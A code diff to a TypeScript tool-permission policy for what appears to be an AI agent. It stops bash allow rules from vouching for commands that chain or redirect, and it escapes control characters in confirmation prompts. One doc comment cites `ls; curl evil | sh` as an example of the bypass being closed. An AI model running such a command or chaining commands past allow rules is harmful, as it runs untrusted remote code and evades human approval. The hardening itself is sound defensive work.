@@ -34,6 +34,14 @@ export interface ToolPolicy {
 	authorize(prompter: Prompter, toolName: string, args: unknown, signal?: AbortSignal): Promise<Authorization>;
 }
 
+/** Shell metacharacters that chain or redirect commands; an allow rule never vouches for a command containing them. */
+const SHELL_CHAINING = /[;&|`<>\n]|\$\(/;
+
+/** Replaces control characters (newlines, ANSI escapes) so a subject cannot forge prompt text. */
+function escapeControl(text: string): string {
+	return text.replace(/[\u0000-\u001f\u007f]/g, (c) => `\\x${c.charCodeAt(0).toString(16).padStart(2, "0")}`);
+}
+
 const SUBJECT_KEY: Record<string, string> = { bash: "command", read: "path", write: "path", edit: "path", web_fetch: "url" };
 
 function subjectOf(toolName: string, args: unknown): string {
@@ -58,11 +66,17 @@ export function createPolicy(cfg: ToolPolicyConfig): ToolPolicy {
 		}
 	});
 
+	/**
+	 * Rules are tested in order against the tool's subject. Deny rules are best-effort regex matches, not a sandbox.
+	 * For bash, allow rules are ignored when the command chains or redirects, so `ls; curl evil | sh` is not allowed by `^ls`.
+	 */
 	const decide = (toolName: string, args: unknown): PolicyDecision => {
 		const subject = subjectOf(toolName, args);
 		for (let i = 0; i < rules.length; i++) {
 			const rule = rules[i];
-			if (rule && rule.tool === toolName && (!rule.re || rule.re.test(subject))) return { action: rule.action, rule: i, subject };
+			if (!rule || rule.tool !== toolName || (rule.re && !rule.re.test(subject))) continue;
+			if (rule.action === "allow" && toolName === "bash" && SHELL_CHAINING.test(subject)) continue;
+			return { action: rule.action, rule: i, subject };
 		}
 		return { action: cfg.policy[toolName] ?? "ask", subject };
 	};
@@ -96,7 +110,7 @@ export function createPolicy(cfg: ToolPolicyConfig): ToolPolicy {
 					}),
 				};
 			}
-			const ok = await prompter.confirm(`Allow ${toolName}: ${decision.subject}?`, signal);
+			const ok = await prompter.confirm(`Allow ${toolName}: ${escapeControl(decision.subject)}?`, signal);
 			if (ok) return { allowed: true };
 			return {
 				allowed: false,
